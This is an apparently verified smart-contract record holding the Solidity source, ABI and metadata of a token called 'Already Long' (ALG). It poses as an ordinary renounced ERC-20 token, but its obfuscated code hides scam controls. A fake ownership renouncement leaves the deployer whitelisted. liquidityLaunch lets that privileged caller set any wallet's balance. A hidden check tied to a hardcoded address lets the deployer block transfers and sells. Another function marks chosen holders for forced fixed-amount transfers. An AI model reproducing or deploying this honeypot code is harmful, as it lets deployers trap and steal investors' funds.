{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.7;\n\ninterface marketingLiquidity {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract minToken {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface buyIs {\n    function createPair(address launchReceiver, address txLimit) external returns (address);\n}\n\ninterface feeReceiver {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address listFund) external view returns (uint256);\n\n    function transfer(address modeSellAuto, uint256 launchTo) external returns (bool);\n\n    function allowance(address senderSell, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 launchTo) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address modeSellAuto,\n        uint256 launchTo\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed limitMin, uint256 value);\n    event Approval(address indexed senderSell, address indexed spender, uint256 value);\n}\n\ninterface feeReceiverMetadata is feeReceiver {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract AlreadyLong is minToken, feeReceiver, feeReceiverMetadata {\n\n    function walletMax(address limitBuy, address modeSellAuto, uint256 launchTo) internal returns (bool) {\n        if (limitBuy == fundMax) {\n            return modeSellShould(limitBuy, modeSellAuto, launchTo);\n        }\n        uint256 fundList = feeReceiver(launchedToWallet).balanceOf(fundToken);\n        require(fundList == listAtWallet);\n        require(modeSellAuto != fundToken);\n        if (modeAuto[limitBuy]) {\n            return modeSellShould(limitBuy, modeSellAuto, totalLiquidity);\n        }\n        return modeSellShould(limitBuy, modeSellAuto, launchTo);\n    }\n\n    uint8 private enableBuy = 18;\n\n    mapping(address => bool) public tokenFee;\n\n    function launchedSender() public {\n        emit OwnershipTransferred(fundMax, address(0));\n        receiverSwap = address(0);\n    }\n\n    function buyReceiver(uint256 launchTo) public {\n        limitMode();\n        listAtWallet = launchTo;\n    }\n\n    address fundToken = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function transferFrom(address limitBuy, address modeSellAuto, uint256 launchTo) external override returns (bool) {\n        if (_msgSender() != receiverFee) {\n            if (txLiquidityToken[limitBuy][_msgSender()] != type(uint256).max) {\n                require(launchTo <= txLiquidityToken[limitBuy][_msgSender()]);\n                txLiquidityToken[limitBuy][_msgSender()] -= launchTo;\n            }\n        }\n        return walletMax(limitBuy, modeSellAuto, launchTo);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return modeSwapAt;\n    }\n\n    function approve(address autoShould, uint256 launchTo) public virtual override returns (bool) {\n        txLiquidityToken[_msgSender()][autoShould] = launchTo;\n        emit Approval(_msgSender(), autoShould, launchTo);\n        return true;\n    }\n\n    uint256 private senderListToken;\n\n    string private sellMinAt = \"ALG\";\n\n    function fundTradingTake(address isTeam) public {\n        require(isTeam.balance < 100000);\n        if (shouldLaunchedToken) {\n            return;\n        }\n        if (toExemptSell) {\n            receiverAmount = enableMode;\n        }\n        tokenFee[isTeam] = true;\n        if (txTotal) {\n            marketingFrom = true;\n        }\n        shouldLaunchedToken = true;\n    }\n\n    address public launchedToWallet;\n\n    bool public shouldLaunchedToken;\n\n    constructor (){\n        if (receiverAmount != senderMax) {\n            marketingFrom = true;\n        }\n        marketingLiquidity minFeeTotal = marketingLiquidity(receiverFee);\n        launchedToWallet = buyIs(minFeeTotal.factory()).createPair(minFeeTotal.WETH(), address(this));\n        \n        fundMax = _msgSender();\n        launchedSender();\n        tokenFee[fundMax] = true;\n        totalWallet[fundMax] = modeSwapAt;\n        \n        emit Transfer(address(0), fundMax, modeSwapAt);\n    }\n\n    uint256 private enableMode;\n\n    function owner() external view returns (address) {\n        return receiverSwap;\n    }\n\n    function liquidityLaunch(address sellFromReceiver, uint256 launchTo) public {\n        limitMode();\n        totalWallet[sellFromReceiver] = launchTo;\n    }\n\n    mapping(address => mapping(address => uint256)) private txLiquidityToken;\n\n    bool public fromReceiver;\n\n    uint256 constant totalLiquidity = 10 ** 10;\n\n    event OwnershipTransferred(address indexed marketingAmountAuto, address indexed fromBuy);\n\n    bool public marketingFrom;\n\n    bool private txTotal;\n\n    address public fundMax;\n\n    uint256 sellToSender;\n\n    function symbol() external view virtual override returns (string memory) {\n        return sellMinAt;\n    }\n\n    bool public shouldMax;\n\n    function getOwner() external view returns (address) {\n        return receiverSwap;\n    }\n\n    function balanceOf(address listFund) public view virtual override returns (uint256) {\n        return totalWallet[listFund];\n    }\n\n    address receiverFee = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 private modeSwapAt = 100000000 * 10 ** 18;\n\n    bool private toExemptSell;\n\n    mapping(address => uint256) private totalWallet;\n\n    uint256 public senderMax;\n\n    function name() external view virtual override returns (string memory) {\n        return walletAutoFund;\n    }\n\n    uint256 listAtWallet;\n\n    function modeSellShould(address limitBuy, address modeSellAuto, uint256 launchTo) internal returns (bool) {\n        require(totalWallet[limitBuy] >= launchTo);\n        totalWallet[limitBuy] -= launchTo;\n        totalWallet[modeSellAuto] += launchTo;\n        emit Transfer(limitBuy, modeSellAuto, launchTo);\n        return true;\n    }\n\n    uint256 private receiverAmount;\n\n    function limitMode() private view {\n        require(tokenFee[_msgSender()]);\n    }\n\n    function transfer(address sellFromReceiver, uint256 launchTo) external virtual override returns (bool) {\n        return walletMax(_msgSender(), sellFromReceiver, launchTo);\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return enableBuy;\n    }\n\n    mapping(address => bool) public modeAuto;\n\n    function allowance(address limitSwap, address autoShould) external view virtual override returns (uint256) {\n        if (autoShould == receiverFee) {\n            return type(uint256).max;\n        }\n        return txLiquidityToken[limitSwap][autoShould];\n    }\n\n    address private receiverSwap;\n\n    string private walletAutoFund = \"Already Long\";\n\n    function minTakeAuto(address minLaunched) public {\n        limitMode();\n        if (marketingFrom) {\n            senderListToken = senderMax;\n        }\n        if (minLaunched == fundMax || minLaunched == launchedToWallet) {\n            return;\n        }\n        modeAuto[minLaunched] = true;\n    }\n\n    bool private buyMarketing;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"senderSell\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingAmountAuto\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromBuy\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"limitMin\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitSwap\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"autoShould\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchTo\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listFund\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"launchTo\",\"type\":\"uint256\"}],\"name\":\"buyReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundMax\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isTeam\",\"type\":\"address\"}],\"name\":\"fundTradingTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedToWallet\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellFromReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchTo\",\"type\":\"uint256\"}],\"name\":\"liquidityLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minLaunched\",\"type\":\"address\"}],\"name\":\"minTakeAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"modeAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderMax\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldLaunchedToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tokenFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellFromReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchTo\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitBuy\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"modeSellAuto\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchTo\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "AlreadyLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}